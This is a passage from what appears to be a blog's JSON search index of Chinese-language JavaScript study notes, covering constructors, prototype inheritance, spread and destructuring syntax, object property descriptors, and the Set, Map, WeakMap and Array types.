Mixins.reduce((accumulator,current) =&gt; {        return current(accumulator)    }, BaseClass) // BaseClass 初始值}class Bus extends mixin(Vehice,doorMixin,glassMixin){}let bus = new Bus();三个注意点  this的指向问题：          constructor 里的this指向创建的实例对象      类中方法的this指向调用的实例对象        类没有变量提示：必须先声明、后使用  使用类中共同属性、方法，一定要加this"
  },
  
  {
    "title": "5. 构造函数",
    "url": "/posts/5.%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/",
    "categories": "JavaScript, Object, 原型链",
    "tags": "javascriptBase",
    "date": "2022-08-23 00:00:00 +0800",
    





    
    "snippet": "构造函数​\t定义： 与普通函数差别在于——使用了new调用function Person(name, age, job){    this.name = name;     // ...    this.sayhello = funciton(){     \tconsole.log('my name is' + this.name)    }}// 使用new定义Person的子类，会自己返...",
    "content": "构造函数​\t定义： 与普通函数差别在于——使用了new调用function Person(name, age, job){    this.name = name;     // ...    this.sayhello = funciton(){     \tconsole.log('my name is' + this.name)    }}// 使用new定义Person的子类，会自己返回对象// 自定义构造函数： 确保被识别为特定类型new执行时做的四件事情   内存中创建对象  指定构造函数：新对象内部的[[Protorype]] = 构造函数的prototype属性  实例化对象：构造函数的this 指向这个新对象  执行构造函数；给新对象添加属性和方法  返回这个新对象 this? this : {}原型​\t使用构造函数创建对象，其定义的方法和属性在每个实例上都备份了一次，但其有些只需要维护一份。​\t为每个函数的prototype属性下包含特点引用类型的 实例共享方法和属性。—— 原来在构造函数中赋予对象实例的值，都可以直接赋值给它们的原型function Person(name) {    this.name = name;}Person.protorype.sayHello = function(){    console.log('my name is' + this.name)}person1 = new Person('小芳');person2 = new Person('小福');person1 === person2 // falseperson1.name == person2.name // falseperson1.sayHello === person2.sayHello // trueconstruct.prototype  prototype 是一个对象，又称原型对象  其属性和方法都归构造函数所有  所有的对象都共享原型对象instance.__proto__  又称为 对象的原型  每个对象都有这个属性构造函数 Person.prototype和 对象person.__proto_是指向是等价的原型的其他构造语法function Person() = {}// 重新定义属性Person.protorype.sayHello = function(){    console.log('my name is' + this.name)}// 1. 对象字面量Person.prototype = {    constructor: fatherClass, // 使用构造函数，指回原来的原型    name: 'humen',    sayHello() {        console.log('My name is '+ this.name);    }}  对象字面量方式，需要重写constructor属性，使得[[Enumerabele]]键值为true。  原生的constructor属性默认不可枚举，需要使用Object.defineProperty()修改回来// 2. 修改 Object.defineProperty()Object.defineProperty(Person.prototype, \"constructor\", {    enumerable: false,    value: Person\t})原型链​\t**对象的原型属性，指向创建它的构造函数object.__proto__.constructor的原型属性 __proto__所指向的原型对象 **​\t修改实例所在的原型链，可以使用Object.setprototypeOf()但不建议。应该通过Object.create(construct)为新对象指定构造函数。成员查找机制（就近原则）  这个对象自身有没有 这个属性（或方法）  没有，查找它的原型 （__proto__指向的prototype原型对象）  还是没有，查找原型的原型（Object的原型对象）  一次类推，直至找到 null 为止实例只有指向原型的指针，没有指向构造函数的指针。​\t实例在原型更改前已经存在，依然可以在原型更改后查找到最新的。因为搜索值的过程是动态的。实例与原型之间的松散关系。​\t实例在构造函数重写前已经存在，依然引用的是最初的原型；重写会切断最初原型与构造函数的联系。in操作符单独使用 in操作符​\t通过对象访问指定的属性时，返回true，无论这个属性是在实例还是原型上。​\t需要使用.hasOwnProperty('..') ，才可以判断是否存在于自有的属性上。function hasPrototyperty(object, name){    return !object.hasOwnProperty(name) &amp;&amp; (name in object)}for-in 循环中使用​\t可以通过对象访问、可以被枚举的属性，都会返回。包括实例属性、原型属性。function Person(name) {    this.name = name;}Person.prototype.local = 'shanhai';Person.prototype.sayHello = function(){    console.log('my name is' + this.name)}let p1 = new Person();// 获取对象上所有可枚举的实例属性Object.keys(Person.protorype); // ['local', 'sayHello']Object.keys(p1);\t// ['name']// 获取对象上所有实例属性，无论是否可以枚举 (constructor 为不可枚举)Object.getOwnPropertyNames(Person.prototype); //  ['constructor', 'local', 'sayHello']Object.getOwnPropertyNames(Person); // ['length', 'name', 'arguments', 'caller', 'prototype']// 获取对象上所有的实例属性，键位符号Object.getOwnPropertyNames()​\t它们枚举顺序是确定的。:one: 先以升序枚举数值键，:two: 插入顺序枚举字符串和符号键 :three: 对象字面量定义的键，以逗号分隔顺序插入继承 6 种方法1、原型链继承；      通过将一个类型A的实例赋值给另一个B构造函数的原型实现的 – B 继承 A        重点：让新实例的原型等于父类的实例 —— 子类的.prototype = new 父类()，子类的实例也是父类的实例    特点：1、实例可继承的属性有：实例的构造函数的属性，父类构造函数属性，父类原型的属性。    缺点：    1、新实例无法向父类构造函数传参。    2、继承单一。    3、所有新实例都会共享父类实例的属性。（原型上的属性是共享的，一个实例修改了原型属性，另一个实例的原型属性也会被修改！）    4、子类.prototype 添加属性必须在 指向了父类之后，否则会被覆盖        查看私有属性：hasOwnProperty() — 包括查找原型链中的 [prototype] 的Property  2、借用构造继承（也称伪造对象或经典继承）；  function Child(name){ Parent1.call(this，name), Parent2.call(this，name)}  优点          实现多继承，通过call改变父类的this      创建的子类实例可以向父类传递参数      解决了原型链继承中，所有子类的实例共享父类实例的属性。        缺点          实例是子类的实例，不是父类的实例。      只能继承父类实例属性、方法；不能继承父类原型上的方法      子类实际上是复制了父类的方法当作自己的方法，多个相同的子类占用较大内存      父类的方法改变时，已经存在的子类实例并不能更新方法      3、组合继承组合：原型链继承 + 借用构造函数继承.call (调用函数者， 参数1， 参数2);改变this的指向function fn(x, y) { console.log(this); }let o = {}fn(1, 2); // this指向windowfn.call(o, 1, 2); // this指向o  主要应用：组合继承构造函数 + 原型对象（ES5）// 构造继承：借用父构造函数，继承其属性function Father(name, age){    this.name = name;    this.age = age;}function Son(name, age){    // this指向Son  调用Father的构造函数，    // 将son.this 替换掉 father.this，于是son就拥有了father的属性    Father.call(this, name, age);    // ... 子类的属性和方法}// 原型对象 继承其方法// 【错误示范】Son.propototype = Father.prototype;Son.propototype.exam = function() {}; // 修改Son构造函数的 方法// console.log(Father) 也存在Son的方法 ———— prototype是对象，赋值传递是引用，两者指向同一个内存空间；继承应执行父类的实例而不是父类对象// 【正确示范】Son.prototype = new Father();  // 新建一个Father实例，既有属性、又有方法； 使用对象的方式修改prototype，会使修改原型链Son.prototype.construcor = Son; // 利用construcor 指回原来的原型对象let son = new Son(\"sonName\",\"sonAge\");​\t核心思想：使用原型链继承原型上的属性和方法，通过借用构造函数继承实例属性。​\t组合继承仍然保留了instanceof操作符和isPrototypeOf()方法识别对象的能力 —— 关注类型和构造函数的场景。​\t存在问题：父类的构造函数始终会被调用两次，导致性能浪费​\t:one: 创建子类原型时调用：获取原型属性 —— 父类实例属性成为子类原型属性​\t:two: 子类构造函数中调用 —— 新对象上创建实例属性，覆盖父类实例属性​\t寄生式组合继承可以解决这个问题4、原型式继承​\tobject()方法通过对传入对象执行了一次浅复制——新对象的原型上既有原始值属性，又有引用值属性。子类对于引用值属性的修改，都会同步影响。​\t适用于：不需要单独创建构造函数，但仍然需要在对象间共享信息。// 06年，Douglas Crockford 所著文章提出的一个函数：function object(o){    function F() {}\t// 创建一个临时构造函数    F.prototype = o; // 将传入的对象作为这个构造函数的原型    return new F;\t// 返回这个修改过原型的对象} // F extends o，再对返回的F对象进行修改// ES5 通过新增 Object.create() 方法，将原型式继承的概念规范化了let Person = {    name: \"Nicholas\",    friends: ['sell','court','bar']}let onePerson = Object.create(Person,{ // 仅有第一个参数，效果与第一个函数一样    name:{        value: \"Gred\"; // 第二个参数与 Object.defineProperties() 第二个参数一样，新增属性要通过自己描述符    }})5、寄生式继承​\t思路类似于 寄生构造函数和工厂模式： 创建一个实现继承的函数，以某种方式增强对象，然后返回这个对象。function createSub(original){    let clone = object(original); // 创建一个父类实例    clone.sayHi = function(){        console.log(\"hi!\")    };    return clone;}​\t返回的 clone 对象相较于 original对象而言，除了拥有其所有属性和方法，还拥有自己的方法。但是会导致函数难以重用。​\t适用范围： 与原型链继承一样，关注对象而不在乎类型和构造函数的场景6、寄生组合式继承 ​\t借用构造函数继承属性（取得父类原型的副本），组合继承方法（给副本设置constructor属性，解决重写原型修改到默认构造函数）。function inheritPrototype(subType, superType){    let prototype = object(superType.prototype); // 取得父类原型的副本    prototype.constructor = subType; // 恢复默认构造函数    subType.prototype = prototype; \t// 新创建的对象作为子类的原型}​\t仅调用一次superType构造函数，避免subType.prototype上获得不必要也用不到属性。​\t原型链仍然保持不变，因此仍然保留了instanceof操作符和isPrototypeOf()方法识别对象的能力 —— 关注类型和构造函数的场景。"
  },
  
  {
    "title": "4. 展开语法  & 解构语法",
    "url": "/posts/4.%E5%B1%95%E5%BC%80%E8%AF%AD%E6%B3%95&%E8%A7%A3%E6%9E%84%E8%AF%AD%E6%B3%95/",
    "categories": "JavaScript",
    "tags": "javascriptBase",
    "date": "2022-08-21 00:00:00 +0800",
    





    
    "snippet": "展开语法  ​\t将数组、对象 转换为用 逗号分隔的参数序列在函数中应用      函数调用 (数组元素迭代为函数参数)    ` myFunction(… args); == myFunction.apply(null, args);`    使用new Function()定义，其传参的最后一个作为函数体，其他作为参数，传参都得是字符串        传参给构造函数    .apply执行...",
    "content": "展开语法  ​\t将数组、对象 转换为用 逗号分隔的参数序列在函数中应用      函数调用 (数组元素迭代为函数参数)    ` myFunction(… args); == myFunction.apply(null, args);`    使用new Function()定义，其传参的最后一个作为函数体，其他作为参数，传参都得是字符串        传参给构造函数    .apply执行的是.call，而不是构造constuct    Object.create() 方法用于创建一个新对象，使用现有的对象来作为新创建对象的原型（prototype）。    // 展开语法：let arr = [1003,3,2];let d = new Date(...arr); //传入(1003, 3, 2)   // 不使用展开语法function applyAndNew(constructor, args) {   function partial () {      return constructor.apply(this, args); // 将数组展开传递给构造函数   };   if (typeof constructor.prototype === \"object\") { // 如果构造函数的类型是对象      partial.prototype = Object.create(constructor.prototype); // 重新指向其构造函数   }   return partial;}var myConstructorWithArguments = applyAndNew(myConstructor, myArguments); // 需要自定一个构造函数      在数组中的应用      复制到新的函数    var lyrics = ['head', ...parts, 'and', 'toes'];         连接两个函数    var list3 = [...list1, ...list2]  ==  var arr3 = arr1.concat(arr2);        数组插入 新数组    开头插入：var list1 = [...list2, ...list1] == Array.prototype.unshift.apply(arr1, arr2)    结尾插入：var list1 = [...list1, ...list2] ==  for( const item of list2) { list1.push(item); }  在对象中的应用​\t已有 对象的所有可枚举 (enumerable) 属性 拷贝到新构造的对象中​\tvar mergedObj = { ...obj1, ...obj2 };   浅拷贝对DOM节点操作· document.querySelectorAll(“ “)获取节点为集合，一个类数组，使用map得转化为数组·  Array.from() 方法对一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例。Array.form(document.querySelectorAll(\"\")).map(function(item){})· 使用节点原型链上的map函数 call()Array.prototype.map.call(div,function(item){})· 展开语法[...div].map(function(item){    item.addEventListener(\"click\",function(){        this.classList.toggle(\"hide\");    });});剩余参数​\t允许我们将一个不定个数的参数表示为一个数组，结合解构语法将剩余变量全部吸收过来，...args需放在结构的最后一个funcion sum(first, ...args){    console.log(first); // 1    console.log(args); \t// [3,4,5]    let total = 0;    args.forEach(item =&gt; total += item);    console.log(total) // 3 + 4 + 5 = 12}sum(1,3,4,5);// 剩余参数 &amp; 解构函数let [s1, ...s2] = [1,3,4,3,5,6]; // s1 = 1, s2 = [3,4,3,5,6]结合使用let {name:myName} = {name:[1,2,3,4],age:'20',sex:'男'}console.log(myName); // [1,2,3,4]let {name:myAge} = {name:[1,2,3,4],age:'20',sex:'男'}console.log(myAge); // '20'数组去重let arr = [12,54,12,75,12]let item = [...new Set(arr)]console.log(item)解构语法​\t对象解构：使用与对象匹配的结构来实现对象属性赋值​\t当元素存在引用对象时，出现浅拷贝的问题// 1. 左侧的数组、对象 批量赋值给 右边的变量let [name,age] = [\"张三\",\"20\"];let person = { name:'Matt', age:27}let {name:name1, age:age1} = person; // name1 = 'Matte',age1 = 27let {name, age} = person; // name = 'Matte',age = 27// 2. 为个别元素添加默认值let [name,age=20] = [\"张三\",\"20\"];// 3. 仅取其中某个值let [,age] =  [\"张三\",\"20\"]​\t在内部使用函数 ToObject() （不能在运行环境中直接访问）把数据源结构转为对象 —— 原始值会被当成对象。Null &amp; undefined 不能被解构，否则会抛出错误。​\t如果给事先声明的变量赋值，则赋值表达式必须包括在括号内。let name, age, page;let person = {    personName : 'matt',    personAge : 27,    personPage:{ title: 'my life'}}let copy = {}// 嵌套解构({personPage: copy.personPage} = person); //  coye = {personPage:{ title: 'my life'}({personJob: job} = person); // 报错! 外部未声明job，内部未声明personJob，不能使用嵌套解构// 参数上下文匹配： 在函数签名中声明函数提内使用的局部变量function printPerson(foo, {personName:name}, bar){\tconsole.log(name)}​\t解构表达式涉及多个赋值，自赋值出错后面都会失败；则整个解构赋值只会完成一部分。"
  },
  
  {
    "title": "3.对象",
    "url": "/posts/3.%E5%AF%B9%E8%B1%A1/",
    "categories": "JavaScript, 对象",
    "tags": "javascriptBase",
    "date": "2022-08-18 00:00:00 +0800",
    





    
    "snippet": "对象​\tECMA-262定义对象为：一组属性的无序集合  —— 对象的每个属性或方法都有一个名称来标识(key) ，并映射到一个值(value)，散列值三种创建方法  new Object()  字面量创建对象 let obj = {}  构造函数创建对象          function obj() = { }      浪费空间：每个方法都需要一个内存空间存放      成员对象  静...",
    "content": "对象​\tECMA-262定义对象为：一组属性的无序集合  —— 对象的每个属性或方法都有一个名称来标识(key) ，并映射到一个值(value)，散列值三种创建方法  new Object()  字面量创建对象 let obj = {}  构造函数创建对象          function obj() = { }      浪费空间：每个方法都需要一个内存空间存放      成员对象  静态成员：由构造函数本身访问  实例成员：由实例化对象访问对象方法Object.keys(obj)：用于获取对象自身 所有的 属性；返回 数组 [属性名1，属性名2，….]对象属性​\tECMA-262使用一些内部特性描述属性特征，由为Javascript实现引擎的规范定义的。不能直接访问，在规范中，使用双中括号，如 [[Enumerable]] 表示。数据属性            [[Configurable]]： 属性是否可以被删除、再次修改 特性，true      false(默认)，影响Object.defineProperty方法调用                  [[Enuumerable]]：属性是否可以枚举，true      false(默认) ，会影响Object.key()显示这个方法                  [[writable]]：值是否可以重写，true      false(默认)，不使用defineProperty时，属性值为true；使用后默认值为false      [[value]]：属性值，默认为undefined​\t在显性添加属性到对象之后，除了[[value]]绑定赋予的值，其他值都会被设置为true。修改属性的默认特性，需要使用Object.defineProperty()方法。​\tObject.defineProperty(目标对象obj, 需修改的属性名prop, 其特性descriptor)Object.defineProperty(obj, 'num', {value:1000}); // writable=false, 非严格模式下无效；严格模式下报错Object.defineProperty(obj, 'id', {writabel:false}); 访问器属性            [[Configurable]]： 属性是否可以被删除、再次修改 特性、是否可以改为数据属性，true (默认)      false，                  [[Enuumerable]]：属性是否可以通过for-in枚举，true (默认)      false，会影响Object.key()显示这个方法      [[Get]]：获取函数，在读取属性是调用，默认值为undefined[[Set]]：设置函数，在读取属性是调用，默认值为undefined​\t不包含数据值，get 和 set 又称为对象属性监视器，用于获取和设置值​\t访问器属性不能直接定义，必须使用 Object.defineProperty()let value = 10;let person = {    age:29;    name:'张三'}Object.defineProperty(person,'age',{    // get函数(getter) -- 属性值被映射到getter上    get:function(){\t\t// 当 person.age 被读取时（每次读取，都会触发getter）        return value;    } // person.age = 10    set(value){    \t// 当 修改person.age值时，新值作为形参value传递\t}})读取属性特性Object.getOwnPropertyDesciptor()可以获取指定属性的属性描述符。let book = new Object()Object.defineProperties(book,{    year_:{ value:2001; }    year:{    \tget: function() { return this.year_; }\t\tset: function(newValue) { this.year_ = newValue; } \t}})// 数据属性：let value_Descriptor = Object.getOwnPropertyDesciptor(book, 'year_');value_Descriptor.value; // 2001value_Descriptor.set // get、set = undefinedvalue_Descriptor.configurable // false// 访问属性：let access_Descriptor = Object.getOwnPropertyDesciptor(book, 'year');access_Descriptor.value; // undefinedaccess_Descriptor.set; // get、set = functionaccess_Descriptor.enumerable; // false;Object.getOwnPropertyDesciptors()静态方法，在每个自有属性上调用Object.getOwnPropertyDesciptor()并在一个新对象中返回他们。ES6 对象语法糖  属性值简写（键值同名）let name = 'matter'let person = { name: name };// 等价于let person = { name };​\t代码压缩程序会在不同作用域内保留属性名，编译器会保留初始标识符function makePeraon(a){    return { name: a };}      可计算属性：使用变量值作为属性    :one:必须先声明对象； :two:使用中括号 —— 对象属性键告诉运行时将其作为JavaScript表达式而不是字符串求值  const nameKey = 'name';let person = {    [nameKey]: 'Matt'}​\tJavaScript表达式求值，可以搭配复制表达式const className = ObjectClassfunction getUniqueKey(key){    return `${className}_${key}`}let person = {    [getUniqueKey(namekey)] : 'Matt'}// person = { ObjectClass_nameKey:'Matt' };​\tJavaScript表达式求值可能抛出任何错误，都会中断对象创建"
  },
  
  {
    "title": "2.11.集合引用类型（Set）",
    "url": "/posts/2.11.%E9%9B%86%E5%90%88%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Set/",
    "categories": "JavaScript, 引用类型",
    "tags": "javascriptBase",
    "date": "2022-08-16 00:00:00 +0800",
    





    
    "snippet": "Set &amp; WeakSet      Set类数组，不可放重复数据，不约束不同类型的数据        对象，约束不同类型的数据（原始值还是对象引用，统统转换为字符串存储），同名属性会覆盖        Set 使用 key:key 方式存储：    set.values === set[Symbol.iterator] // trueset.keys === set[Symbol....",
    "content": "Set &amp; WeakSet      Set类数组，不可放重复数据，不约束不同类型的数据        对象，约束不同类型的数据（原始值还是对象引用，统统转换为字符串存储），同名属性会覆盖        Set 使用 key:key 方式存储：    set.values === set[Symbol.iterator] // trueset.keys === set[Symbol.iterator] \t// trueset.values() === set.keys() // false  set.entries(); // 返回集合中的每个值重复出现// 0: {\"李四\" =&gt; \"李四\"}// 1: {\"王五\" =&gt; \"王五\"}// 2: {\"吴六\" =&gt; \"吴六\"}      定义const m = new Set() // 空映射，可用const定义// 同时初始化实例，需要传入一个可迭代对象——包含键值对的数组// 每个键值对按顺序插入到新映射实例中let Set = new Set([\"李四\", \"王五\", \"吴六\"]);console.log(Set); // 3// 使用自定义函数初始化const Set2 = new Set({    [Symbol.iterator]: function*() {        yield 'value1';        yield 'key2','value2';        yield 'key3','value3';    }})console.log(mep2.size); // 3const set = new Set([1,2,3,4,6,4,2,1]);  // Set(5) {1, 2, 3, 4, 6} 自动去重// 声明时变量为字符串，将字符串展开为单个字符赋值成对象,，并自动去重const set = new Set('hello');  // Set(4) {'h', 'e', 'l', 'o'} 自动去重增删改查const set = new Set([['firstName','matter'],['lastName','petter']]);// 新增值,返回Set对象,可以链式定义set.add(\"name\",\"张三\").add('age',10)// 查询值 // 1. 通过键查找: set.has(key)set.has('firstName'); // trueset.has('matter'); //false// 2. 返回所有键 set.keys(); // SetIterator {'李四', '王五', '吴六'}// 3. 返回所有值set.values(); // SetIterator {'李四', '王五', '吴六'}// 4. 返回所有键值对set.entries(); //SetIterator {'李四' =&gt; '李四', '王五' =&gt; '王五', '吴六' =&gt; '吴六'} // 查询个数set.size() // 3// 删除// 1. delete(key) 是否成功删除 set.delet('firstName'); // tureset.delet('firstName'); // false// 2. clear() 全删,无返回值set.clear(); // undefined Set.size=0转换      set换数组：                  Array.from(set);                    [...set]                  数组换set：去重复    // 数组去重const set = new Set(['a','b','a','b']);const ary = [...set]   [... new Set(array)]      遍历  取值：\tset.value / set.entries  forEach( function(value, key, arr))：value = key  for-of： set.value自定义操作：交并差​\tSet 和 Map 一样可以存放各种数据类型作为值，使用 SameValueZero 操作判断是否相等（类似于严格相等===）  并：合并多个set，去重const a = new Set([1,2,3,4,5,3,2,4])const b = new Set([1,2,3,4,5,7,8,9])// 第一种方法new Set([...a,...b]) // Set(8) {1, 2, 3, 4, 5, 7, 8, 9}// 第二种方法function union(a, ...bSets){    const unionSet = new Set(a);    for (const b of bSets){        for(const bValue of b){            unionSet.add(bValue);        }    }    return unionSet;}unionf(a, b) // Set(8) {1, 2, 3, 4, 5, 7, 8, 9}  差： 展开[a]每个元素过滤掉 b存在 的元素// 第一种方法new Set(\t[...a].filter(function(item){        return !b.has(item);    }))// 第二种方法function difference(a, b) {    const differenceSet = new XSet(a);    for(const bValue of b){        if(b.has(aValue)) differenceSet.delete(bValue);    }    return differenceSet;}  交：展开[a]每个元素过滤掉 b不存在 的元素// 第一种方法new Set(\t[...a].filter(function(item){     \treturn b.has(item);       }))// 第二种方法: 返回两个或更多集合的交集function intersetion(a, ...bSets) {    const intersectionSet = new XSet(a);    for (const aValue of intersectionSet){        for(const b of bSets){            if(!b.has(aValue)) intersectionSet.delete(aValue);        }    }    return intersectionSet;}                              对称差集 ： 所有不属于A∩B的元素的集合，$A△B = {x          x∈A∪B,x∉A∩B} = (A∪B) — (A∩B)$                    function symmetricDifference(a, b){    return a.union(b).difference(a.intersection(b));    // a.union(b) 取全集    // a.intersection(b) 取同时属于a、b交集    // c.difference(d) \t// 全集下不属于交集的部分}  笛卡尔积 ：X×Y，第一个对象是X的成员而第二个对象是Y的所有可能有序对function cartersianProduct(a, b){    const set = new Set();    for(const aValue of a){        for(const bValue of b){            set.add([aValue, bValue]); // 数组的集合        }    }    return set;}  集合的幂集 ：集合中所有的子集（包括全集和空集）构成的集族function powerSet(a){    const powerSet = new Set();    powerSet.add(new Set()); // 包含空集    for(const aVal of a){        for(const set of new Set(powerSet)){            powerSet.add(new Set(set).add(aVal))        }    }}WeakSet值必须是引用类型，保存对象数据。 不是正式引用，不会影响垃圾回收机制。对DOM操作时，DOM节点删除后无需修改WeakSet的引用弱引用类型的特性      强引用类型的特性    对象、数组对同一块内存空间引用时，会将空间引用数+1    当所有对该内存空间引用被置为null时，JavaScript对该内存数据当作垃圾处理，回收空间        弱引用类型的特性    WeakSet作为弱引用类型使用内存空间时，不会将空间引用数+1    当该内存空间引用数为0时，JavaScript对内存回收不会通知WeatSet引用数据不存在    WetSet访问为No propertise    无法使用循环  无法访问.value .key .size等属性  无需将引用赋值为null"
  },
  
  {
    "title": "2.10.集合引用类型（Map）",
    "url": "/posts/2.10.%E9%9B%86%E5%90%88%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Map/",
    "categories": "JavaScript, 引用类型",
    "tags": "javascriptBase",
    "date": "2022-08-14 00:00:00 +0800",
    





    
    "snippet": "Map &amp; WeakMap不同于Set、对象，Map元素键值对可以为对象、字符串、函数、数字等，但必须是可迭代的数据类型定义const m = new Map() // 空映射，可用const定义// 同时初始化实例，需要传入一个可迭代对象——包含键值对的数组// 每个键值对按顺序插入到新映射实例中let map = new Map([    [function(){},\"李四\"],...",
    "content": "Map &amp; WeakMap不同于Set、对象，Map元素键值对可以为对象、字符串、函数、数字等，但必须是可迭代的数据类型定义const m = new Map() // 空映射，可用const定义// 同时初始化实例，需要传入一个可迭代对象——包含键值对的数组// 每个键值对按顺序插入到新映射实例中let map = new Map([    [function(){},\"李四\"],    [{},\"王五\"],    [1,\"吴六\"]]);console.log(map); // Map(3)// 使用自定义函数初始化const map2 = new Map({    [Symbol.iterator]: function*() {        yield ['key1','value1'];        yield ['key2','value2'];        yield ['key3','value3'];    }})console.log(mep2.size); // 3增删改查const map = new Map([['firstName','matter'],['lastName','petter']]);// 新增值,返回Map对象,可以链式定义map.set(\"name\",\"张三\").set('age',10)// 查询值 // 1. 通过键查找: map.has(key)map.has('firstName'); // truemap.has('matter'); //false// 2. 返回所有键map.keys();// 3. 返回所有值map.values();// 4. 返回所有键值对map.entries();// 查询个数map.size() // 3// 删除// 1. delete(key) 是否成功删除 map.delet('firstName'); // turemap.delet('firstName'); // false// 2. clear() 全删,无返回值map.clear(); // undefined map.size=0循环Map 实例会维护插入顺序，提供一个迭代器（Iznterator）生成 [key, value]形式的数组。可以使用entries() / Symbol.iterator 获得这个迭代器。因为 entries() 是默认迭代器，所以可以调用 展开操作符，将Map对象转换为数组对象  for循环for(const [key,value] of map.entries()){    console.log(value,key);}for(const pair of map[Symbol.iterator]){    console.log(pair);}map.entries() === map[Symbol.iteratror] // true  forEach循环map.forEache((value,key) =&gt; {    console.log(value,key);},this)修改值​\t—— 键是引用类型时，修改内部数据不影响映射的值// 键为字符串时，修改无效const strMap = ([    ['key1','val1']])for (let key of strMap.keys()){    key = 'newKey';    console.log(key); // newKey    console.log('newKey'); // undefined    console.log(strMap.get('key1')); // val1}// 键为对象属性时，内部映射依然引用相同的地址const objKey = {id:1};const objMap([    [objKey,'val2']])for (let key of objKey.keys()){    key.id = 'newKey';    console.log(key); // {id:\"newKey\"}    console.log(objKey.get(objKey)); // 'val2'}转换      数组 ...map 或者 [... map]        利用数组过滤器    [... map].filter(item =&gt; {return item[1].include(\"111\")} ) // item[1] 指键名        转换回map类型  与Object相比的优势  内存占用（多存储）：在给定固定内存大小里，Map 可以比 Object 多存储 50% 的键值对  插入性能（快）：消耗大致相当  查找速度（性能差异小）：Object 在类数组使用的情况下，更快  删除性能          删除 object  只能使用 伪删除对象属性的操作， 值设置为undefined 或者 null      删除 map ，delete() 操作比插入和查找更快      使用场景  ​\t表单提交前，检查某些元素的状态，当返回值是false时，阻止提交并跳出弹窗function post(){    let map = new Map();    let inputs = document.querySelectorAll(\"[error]\");    inputs.forEach(item =&gt; {        map.set(item,{            error:item.getAttribute(\"error\"),            status:item.checked        })    })}return [...map].every(([elem,config])=&gt;{    config.status || alert(config.error); // 或 短路运算    // 已勾选status=true，退出判断；    // 否则，未勾选status=false，执行第二个语句，跳出弹窗    return config.status;})weakMap键只能是 Object 或者 Object类型，其他非对象设置为键会抛出 TypeError； 值的设置没有限制// 初始化 是一个全有全无的操作const wm = new WeakMap([    [key1, 'val1'], [key2, 'val2'], ['errkey', 'val3'] // 'errkey' 将导致初始化失败])// 但可以先把原始值包装成对象再作为键const objStr = new String('errKey');wm.set(objStr, 'val3')// weakMap 拥有于 Map 相似的方法；但没有 clear() —— 随时都可以被销毁  弱键： 键不属于正式引用，不会阻止垃圾回收； 值的引用，属于正式引用，影响垃圾回收只要存在键值对于映射中，并当作对值的引用，值就不会被垃圾回收。  不可迭代键：不能在不知对象引用的情况下从弱映射中获得值。之所以限制 只能用Object 作为键，是为了保证通过 键对象引用（内存唯一值）才能取得值使用weakMap私有变量私有变量存储在弱映射中，以对象实例为键，以私有成员为值const User = (() =&gt; {    const wm = new WeakMap(); // 闭包内的wakMap 不暴露在外，统一实例才使用同一个weakMap    // 且生存时间与实例同步，而不是与类同步    class User {        // ...        setPrivate(property, value){            const privaterMembers = wm.get(this) || {}; // 获取当前实例            privaterMembers[property] = value; // weakMap 新增键值对            wm.set(this, privaterMembers); // 返回weakMap        }        getPrivate(property) {\t\t\treturn wm.get(this)[property]        }        // ...    };    return User;})();// cosnt User = ()()const user = new User('张三');user.getPrivate(id);不使用闭包，直接定义 class，外部可以通过对象实例的引用获得私有变量// wm 在 外部定义，使用同一个weakmap，可以通过实例获取wm.get(user)[user.getPrivate];但也是代码完全陷入ES6之前的 闭包私有变量模式操作DOM元素对象&lt;div name=\"1\"&gt;11&lt;/div&gt;&lt;div name=\"2\"&gt;22&lt;/div&gt;使用 Map 关联元数据：let map = new Map();// 对应DOM中每个div元素对象，存入Map中，后续不需要操作DOM直接操作Mapdocument.querySelectorAll(\"div\").forEach(item =&gt;{    map.set(item,{        content1:item.getAttribute(\"name\"),        content2:item.innerHTML    })})// map:Map(2) [[Entries]] 0:{div=&gt; Object}// 0:{key:div, value: {content:\"1\",content2:\"11\"}}console.log(map);map.forEach((config, elem)=&gt;{    // map.item --        // this:undefined        // config:{content1:\"1\", content2:\"11\"}        // elem: div    elem.addEventListener(\"click\", ()=&gt;{        alert(config.content1)    })})​\t存在问题： 当关联的元数据从DOM树删除后，其值依然被 Map实例 引用而不能删除，所以对应的DOM节点依然滞留在内存中，除非明确销毁​\t使用弱映射是，代码执行完毕 weakmap 被回收，没有实例引用DOM节点，这其从DOM树删除后就可以立即释放内存let wm = new WeakMap();const fistDIV = document.querySelector('div');wm.set(firstDIV,{disable: true});firstDIV.remove()"
  },
  
  {
    "title": "2.9.基本引用类型（Array）",
    "url": "/posts/2.9.%E5%9F%BA%E6%9C%AC%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Array/",
    "categories": "JavaScript, 引用类型",
    "tags": "javascriptBase",
    "date": "2022-08-12 00:00:00 +0800",
    





    
    "snippet": "Array1️⃣ 有序； 2️⃣ 每一个项可以保存任何类型的数据； 3️⃣ 动态大小，自动增长基本操作  创建：          new Array  可以忽略new声明数组，效果一样      ['value1', 'value2']  与Object一样，不会调用构造函数      Array.from(arrayLike, mapFun, thisArg)  类数组结构 → 数组实例...",
    "content": "Array1️⃣ 有序； 2️⃣ 每一个项可以保存任何类型的数据； 3️⃣ 动态大小，自动增长基本操作  创建：          new Array  可以忽略new声明数组，效果一样      ['value1', 'value2']  与Object一样，不会调用构造函数      Array.from(arrayLike, mapFun, thisArg)  类数组结构 → 数组实例 （浅复制）                  arrayLike — 想要转换成数组的伪数组对象或可迭代对象                          伪数组对象（拥有一个 length 属性、可索引元素结果的对象）              可迭代对象（Set Map等）                                mapFun — [可选] 新数组中的每个元素会执行该回调函数          thisArg — [可选] 执行回调函数mapFun时的this对象                    Array.of() 一组参数 → 数组实例                  代替 Array.prototype.slice.call(arguments) 将对象转为数组的方法                      取值：基于0开始的 数字索引  长度 length （不仅是可读属性）          0 ≤ length      移动至 length = length-1 删除最后一个元素      移动至 length = length+1添加最后一个元素        判断： isArray()          使用instanceof 判断是否处于同一个继承链中，在封装过Array构造函数后的情况下，数组会不相同      isArray() 不论哪个全局执行上下文中创建，也可能判断是否为数组      数组空位 const options = [,,,,,]; // 使用一串逗号来创建空位ES6中， 会将空位视为 存在的元素，值为undefinedES6之前，将空位忽略，或视为空字符串 —— 行为不同、存在与否，会导致不同平台出现问题​\t如果需要空位，可以用显示的undefined值代替查找严格相等查找 （===比较）  indexOf('') &amp; lastIndexOf('')：从0开始，不存在返回 -1  